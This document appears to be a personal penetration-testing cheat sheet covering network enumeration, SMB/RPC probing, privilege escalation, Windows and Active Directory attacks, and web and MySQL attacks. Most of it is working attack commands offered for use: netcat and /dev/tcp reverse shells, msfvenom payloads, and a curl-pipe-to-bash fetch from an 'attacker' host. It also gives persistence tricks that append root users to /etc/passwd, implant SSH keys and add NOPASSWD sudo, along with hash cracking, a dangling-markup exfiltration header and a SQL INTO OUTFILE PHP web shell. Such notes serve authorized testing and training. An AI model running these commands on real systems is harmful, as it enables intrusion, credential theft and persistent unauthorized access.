# Pen Test Notes
## External enumeration
### nmap thorough scan:
```
nmap -v -sV -Pn -A -p- --reason
nmap -v -sV -Pn -A -p- --reason  -oA FILENAME <IP>
nmap -v -sV -Pn -A -p- --reason -oA 192.168.8.0-24 192.168.8.0/24
```

### nmap default scripts: 
    nmap -sC 

### nmap  run specific scripts:
    nmap -Pn --script "http*" --script-args <n1>=<v1>,<n2>={<n3>=<v3>},<n4>={<v4>,<v5>}
or use
    --script-help

### scan for open ports using only bash. This is slow because it does a syn retransmission and backoff.
```bash
export TARGET=<IP ADDRESS>
for i in {1..65535} ; do (timeout .5 bash -c "echo < /dev/tcp/$TARGET/$i") &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
```

or for more targeted ports:
```bash
for i in 21 22 23 80 135 443 445 3389 ; do (timeout 1 bash -c "echo < /dev/tcp/$TARGET/$i") &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
```

(or maybe this? Untested)
```bash
#echo 21 22 23 80 135 443 445 3389 ; do (timeout 1 bash -c "echo < /dev/tcp/$TARGET/$i") &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
````


## netcat banner grab
```
nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0
Referrer: meh-domain
```

alternatively, use wfuzz or ffuf
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403  -H "Host: FUZZ.example.com" -u http://example.com -t 100
```

Add ```--hh (bytecount to ignore)``` to ignore "expected" pages

## Directory Fuzzing

If its a linux box, take out asp and aspx to save some time

```
dirb http://TARGET:PORT/ -X .html,php,asp,aspx,bak,jsp /usr/share/dirb/wordlists/
dirsearch.py -u http://TARGET:PORT/ -t 16 -r -e txt,html,jsp,php,asp,bak,aspx -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --plain-text-report="outputfile"
gobuster -e -u http://TARGET:PORT -w /usr/share/wordlists/dirb/common.txt
```

## SMB Enumeration 
If tcp/445 is open, enum4linux.pl (or similar) is a great place to start.

### No credentials
List shares using Null session
```
smbclient -U '%' -N -L \\<TARGETIP>
smbclient -U '%' -N \\\\<TARGETIP>\\ShareName
```
If part of a domain:
```
smbclient -L \\Domain_Name -I <DC_IP> -Ne
```

Check if any of the shared paths is writable. If any shared path is writable with known account credentials, we can use Psexec for Remote command execution.

    smbclient \\\\<Domain_name>\\<share path> -I <DC_IP> -N


### With Credentials
```bash
smbclient -U "username%password" \\\\host\\SHARE
```


## RPC (tcp/135)
Authenticated or unauthenticated. Below is example for null session.
```
rpcclient -U "" -N $IP
```

Useful rpcclient commands:
```
srvinfo
lsaenumsid   # finds SiDs
enumdomusers     # rid is the suffix of the sid in hex.
enumalsgroups domain
enumalsgroups builtin
enumdomgroups
enumprivs
lookupnames administrators   # gives full SID
queryuser <RID>
queryuser 500  # always administrator


```

### Authetnicated RPC 
smb password attempt:
rpcclient -U "user%pass" -c "getusername;quit" ip



# Reverse Shell-Fu / Code Execution
To generate payloads / netcat shells, here are some hints that have been helpful.

## PHP LFI Execution

## Netcat
    nc -nvv $MYIP $PORT -e /bin/bash
    
## Reverse Shell without netcat:

    bash -i >& /dev/tcp/$MYIP/80 0>&1

##  Upgrade a shell:
```
	python -c 'import pty; pty.spawn("/bin/bash")'
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	echo os.system('/bin/bash')
	/bin/sh -i
	perl â€”e 'exec "/bin/sh";'
	perl: exec "/bin/sh";
	ruby: exec "/bin/sh"
	lua: os.execute('/bin/sh')
	# (From within IRB)
		exec "/bin/sh"
	# (From within vi)
		:!bash
	# (From within vi)
		:set shell=/bin/bash:shell
	# (From within nmap)
		!sh
```

## Upgrade even harder!
Want tab completion and even more convenience? You can then ctrl-z and do:
```
	stty -a | head -n1
	stty raw -echo 
	fg
```
and then from within the remote shell:
```
	export HOME=/root
	export SHELL=/bin/bash
	export TERM=xterm-256color
	stty rows X columns Y
```





# Internal Enumeration
After you get a foothold....

## So you got RCE...
So you got RCE, either as a foothold, as a user, or found a way to read/write/run files as root. How can you use this? There's always a reverse shell, that's fine, but lets get a little more creative.

### Steal ssh keys
Can you use your RCE privs to read sensitive files? Try ```cat /root/.ssh/id_rsa``` or ```cat /root/.ssh/id_dsa```, or copy those files somewhere where you can read them (/tmp?). And that's not limited to root. You can try to steal regular users ssh keys. The nice thing about having a stolen SSH key (or password) is that its persistant access, like a save-point. You can walk away, reset the machine, whatever, come back a few days later, and just ssh back in to get to where you were.

If the user doesn't have ssh keys... but you can execute code in their context, no reason you can't ssh-keygen them yourself and put them there.

### Add your own ssh key
Take your own ssh public key (or generate one just for this), and use your access to ```echo 'FULL_CONTENTS_OF_YOUR_OWN_ID_RSA.PUB' >> /root/.ssh/authorized_keys```. For some reason, I just love this one.

### Steal /etc/shadow
If  all you can do is read, and there aren't keys you can steal, grab /etc/shadow and try to crack hashes in there. Problem is, it's bcrypt these days, and that's pretty slow cracking on GPUs.

### Modify /etc/passwd to add a new root user
Add a priveleged user with a known password
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
and then for your rce payload
``` echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd```

and now you can do ```su hacker``` or ssh in as hacker with creds hacker:hacker.
If you're lazy, just use a blank password:
```echo 'instantroot::0:0::/root:/bin/bash' >>/etc/passwd```


### Give yourself (or anyone) sudo access
```echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers```



For more ideas, see https://book.hacktricks.xyz/linux-unix/privilege-escalation#interesting-files


## Finding "useful" lines in config files
Some config files have tons of comments, and its a pain to visually parse out what settings have been changed. Use inverse grep, and then grep for lines that only have characters. Here's sshd_config as an example
``` 
grep -v \# /etc/ssh/sshd_config | grep .
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp  /usr/lib/openssh/sftp-server
PasswordAuthentication yes

```

## Live Off The Land - Addtional Host Enumeration
Actively elicit ARP responses across network for host discovery:
Check arp cache:
    arp -an
or 
    ip n


```bash
for i in {1..255} ; do ping -nc 1 -W 1 10.1.1.$i ; ip n >>disc.txt; done
```
or
```bash
for i in {1..255} ; do nc -nvzu -w 1 -r   10.1.1.$i 13541; ip n >>disc.txt; done
``` 



### Another version LOTL Host Discovery and ARP soliciation
This will not only show ping responses, but will also populate the arp cache, which can show hosts that are dropping ICMP packets. If they want to be reachable by IP, they have to respond to ARP requests.

```bash
for i in $(seq 1 254); do (ping -c 1 10.1.1.${i} | grep "bytes from" &) ;done; sleep 5; ip n | grep REACHABLE  | sort |uniq
```




## Getting data/scripts to target:
    $ cat <<EOF > target_file.py
  
  Then copy the file content and paste it in the terminal. And after you pasted it into the Terminal you type EOF.
 
 You can take this concept further by base64 encoding to transfer binaries like this. For example when you have a .tar.gz file you want to get to the server. On your machine you do:

    cat archive.tar.gz | base64 | xclip

Copy the long base64 encoded file (which xclip should do. Super useful!) . And on the target do the following:
```bash
cat <<EOF | base64 -d > archive.tar.gz
///// paste here the base64 encoded file
EOF
```
 
# Shellshock
## CVE-2014-7186
```bash
bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"
```

 ## CVE-2014-7187
 ```bash
 (for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"
 ```
 

# Meterpreter / MSFVenom:
## MSFVenom Payload Creation
Especially useful for buffer overflow payloads. 
### Unstaged Reverse TCP shell
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
msfvenom -p php/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0" -o payload.c
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f py -e x86/shikata_ga_nai -b "\x04\xA0" -o payload.py



```

### Staged Meterpreter
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```

### Windows Reverse Meterpreter Handlers 
 ```
     handler -H LHOST -P port -p windows/x64/meterpreter_reverse_https
     handler -P <PORT> -p multi/meterpreter/reverse_http
     handler -P <PORT> -p multi/meterpreter/reverse_https
```


cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php



 
setuid doesn't work on scripts or bash


# Privesc
## Linux Privesc Enumeration
Here are some initial, basic enumeration steps to find some easy wins and some info that might be useful.
```bash
hostname
id      # who are we, and what groups are we in?
uname -a      # system stuff
cat /etc/issue    # what OS?
cat /etc/*-release  # what OS?
cat /etc/passwd     # duh
cat /etc/shadow     # probably not, but you never know
ps aux              # what processes? Look for what root and other users are running
ps -eaf    #same, formatted different

sudo -l    # what can you do as a priveleged user?

ip a
ifconfig -a
/sbin/route -n
netstat -antup
ss -antup
iptables -nvL    # this is priveledged, and also you need to manually check the other tables
cat /etc/iptables/*
# find other poorly protected iptables-save output in /etc
find /etc/ -name "*iptables*" 2>/dev/null -exec ls -l {} \;

ls -lah /etc/cron*
cat /etc/crontab
crontab -l

# Find SUID and GUID binaries.
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
find / -perm -g=s -type f  -exec ls -l {} \;  2>/dev/null
find / -writable -type d 2>/dev/null

# Find capabilities. Look for cap_setuid but there are a ton of others
getcap -r / 2>/dev/null

ls -latr /home
ls -latr /etc
ls -latr /opt
ls -latr /srv

cat /etc/ssh/sshd_config

find / -name "*id_rsa*" -type f  -ls 2>/dev/null
find / -name "*id_dsa*" -type f  -ls 2>/dev/null


dpkg -l   # list packages on Debian boxes
dpkg -V   # Verify their authenticity

cat /etc/fstab    # file systems?
mount         # what's mounted and how?
/bin/lsblk    # USB?

# What kernel modules are loaded? Maybe exploitable
lsmod
/sbin/modinfo <MODULENAME>




tmux ls
screen -ls

# Are we in a docker / lxc container?
grep 'docker\|lxc' /proc/1/cgroup 
ls -latr /.dockerenv

```

linPEAS is fantastic, drop and execute if you can. Pipe to a file and pull it back. Make sure you check out any linked articles.

Even better, run it completely filelessly. Serve it up with an http server (eg. python3 -m http.server 80) and then:
`ssh targetip 'curl http://attacker/linpeas.sh | bash ' | tee lp.txt`

To read it, `less -rf`



For both screen and tmux, make sure you take a look at .tmuxrc and .screenrc to ensure you understand the key bindings, which may not be default.
Connecting to an existing session, to an actively used window by a real user could result in observable side effects. Be careful.

## Reattach to tmux 
```
tmux ls
tmux -S <tmux session file>
```

## List and attach to screen session
This won't deatch other users from the screen session if they're on, so it is a little less alerting.
```bash
screen -ls
screen -x
```

exfil data with wget --post-file to locally hosted http server


# Windows tips 
## File transfer made easy!
```
srv$ sudo smbserver.py -smb2support srv .
```

and on target:
```
copy \\attackerip\srv\file .
or
copy importantfile \\attackerip\srv\file
```
A bonus is that you get a NetNTLMv2 hash with this, that you can try to crack with hashcat. Put the *whole* hash collected into a file, and then
```
hashcat -m 5600 -r rules\best64.rule ntlmhash.txt -o ntlm-cracked.txt rockyou.txt
```


## directory listing, sorted by modification date:
dir /ot


## powershell 2.0 "wget"
```powershell
powershell -command  "(new-object System.Net.WebClient).DownloadFile('http://10.10.12.45:8080/1.exe','C:\Users\security\Downloads\1.exe')
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```

## view powershell readline history
```
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```


## get password policy with null authentication with crackmapexec
```
crackmapexec smb <ip> --pass-pol -u '' -p ''  
```

john the ripper example (wordlist mutation)
```
john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt passwordfile  --rules
```

## Kerberos / AD
### Identify a user (OSINT, user bruteforce, kerbrute a possible user list)
 See https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

### Unautheneticated ticket:
    python3 GetNPUsers.py DOMAIN/User -no-pass

with the resulting hash: 
$krb5asrep$23$user@DOMAIN:HAAAAAAAAAAAAAAAAAAASH

```
john --wordlist=/usr/share/wordlists/rockyou.txt result.hash
john --wordlist=/usr/share/wordlists/rockyou.txt 
john --show <filename>
```

Generates year permutations of a wordlist
```bash
for i in $(cat pwdlist.txt); do echo $i; echo ${i}2019; echo ${i}2020;echo ${i}\!; done > pwlist.txt

hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7 ' > wordlist.txt
```
 
### impacket summary

Remote code Execution : atexec.py, dcomexec.py, psexec.py, smbexec.py and wmiexec.py
SMB/MSRPC : getArch.py, ifmap.py, lookupsid.py, samrdump.py, services.py, netview.py, smbclient.py, opdump.py, rpcdump.py and reg.py
Kerberos: GetST.py, GetPac.py, GetUserSPNs.py, GetNPUsers.py, ticketer.py and raiseChild.py
Windows Secret: mimikatz.py
Server Tools/MiTM Attacks: karmaSMB.py and smbserver.py
WMI: wmipersist.py
Known Vulnerabilities: sambaPipe.py and sambaPipe.py
MS/ TDS: mssqlclient.py
File Formats: ntfs-read.py and registry-read.py.
Others: mqtt_check.py, rdp_check.py, sniffer.py, ping.py, and ping6.py


# Web attacks

## PHP / Web Attacks
If your PHP RCE of choice isn't working, try 
    echo ini_get('disable_functions');

Other options might include:
    system(); exec(); passthru(); shell_exec();

## LFI Code execution
Possible paths to RCE with LFI (beyond just information disclosure!)
* file upload forms/functions
* Using the PHP wrapper expect://command
* Using the PHP wrapper php://file
* Using the PHP wrapper php://filter
* Using PHP input:// stream
* Using data://text/plain;base64,command
* Using /proc/self/environ
* Using /proc/self/fd
  * Using log files with controllable input like:
  * /var/log/apache/access.log
  * /var/log/apache/error.log
  * /var/log/vsftpd.log
  * /var/log/sshd.log
  * /var/log/mail



One example - Include php code in your get request, and then use LFI to show the access log; the code may be executed.

- Gifsicle - modify gifs to include poisoned data / code such as PHP -  https://www.lcdf.org/gifsicle/ 

Resources: 
- https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/
- https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
- https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2


## HTTP Header Attacks
### Dangling Markup
Excellent writeup with portswigger academy. Some things to try:
Check if Host header is reflected by changing it, possibly append a port, with arbitrary text. If this works, you can try a dangling Markup attack:
`Host: regularhost.com:'<a href="http://attacker-webserver/?`

Check the logs on your web server, you may see content leaked there. If necessary, consider changing the quotes from single to double, or vice versa, depending on what's prevailant on the system.

Also try:
- X-Forwarded-Host
- X-Host
- X-Forwarded-Server
- X-HTTP-Host-Override
- Forwarded


## Command Execution
Useful to put a delimiter before *and* after the injected command. e.g. `  ; whoami  ; ` so that additional data doesn't go to arguments


# MySQL / MariaSQL (other SQL servers?)
## MySQL queries from a command line (useful for a web shell)
```
mysql -u username -pPASSWORD DATABASENAME -e 'whatever query you want'
```
Make sure that there is no space between the p and the password. So for example:
```
mysql -u shootermcgavin -pbreakfast golfdata -e 'SELECT * FROM users;'
```

## MYSQL enumeration 
```
show databases;
use <database>;
show tables;
describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Try to execute code
select do_system('id');
\! sh
```

## Basic MySQLi
```
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"
```

## Read & Write
```
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
```


## Try to change MySQL root password
```
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```
## Any useful functions?
   select * from mysql.func


 

# My initial machine setup:
## Favorite prompt:
```
# export PROMPT_DIRPATH=3   #this might have been incorrect
export PROMPT_DIRTRIM=3
PS1="\[\033[0;33m\][\!]\`if [[ \$? = "0" ]]; then echo "\\[\\033[32m\\]"; else echo "\\[\\033[31m\\]"; fi\`[\u.\h: \w]\\$\[\033[0m\] "
```
## zsh equivilent (or close enough
```
PROMPT='%F{yellow}%}[%h]%f%(?.%F{green}.%F{red}%})[%n.%m: %3~]%(!.#.$) %{$reset_color%}'
```

## Some decent starter iptables I like on my Attack Box
```
# Generated by xtables-save v1.8.2 on Wed Feb 20 13:30:39 2019
*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]
:LOGDROP - [0:0]
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -m conntrack --ctstate INVALID -j DROP
-A INPUT -j LOGDROP
-A FORWARD -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m multiport --dports 53,67,68,1337 -j ACCEPT
-A OUTPUT -p tcp -m multiport --dports 22,53,80,443,1337 -j ACCEPT
-A OUTPUT -d 10.10.10.0/24 -o tun0 -j ACCEPT
-A OUTPUT -j LOGDROP
-A LOGDROP -m limit --limit 2/min -j LOG --log-prefix "iptables DROP"
-A LOGDROP -j DROP
COMMIT
# Completed on Wed Feb 20 13:30:39 2019
```

## Troubleshooting
If gnome-terminal wont' start, edit /etc/locale.conf and enable en_US.UTF8 and run locale-gen




## SSH Tricks and Hints
### SSH escape sequences
```
Press enter, then ~, then one of the following
> ~?
Supported escape sequences:
 ~.   - terminate connection (and any multiplexed sessions)
 ~B   - send a BREAK to the remote system
 ~C   - open a command line
 ~R   - request rekey
 ~V/v - decrease/increase verbosity (LogLevel)
 ~^Z  - suspend ssh
 ~#   - list forwarded connections
 ~&   - background ssh (when waiting for connections to terminate)
 ~?   - this message
 ~~   - send the escape character by typing it twice
(Note that escapes are only recognized immediately after newline.)
```


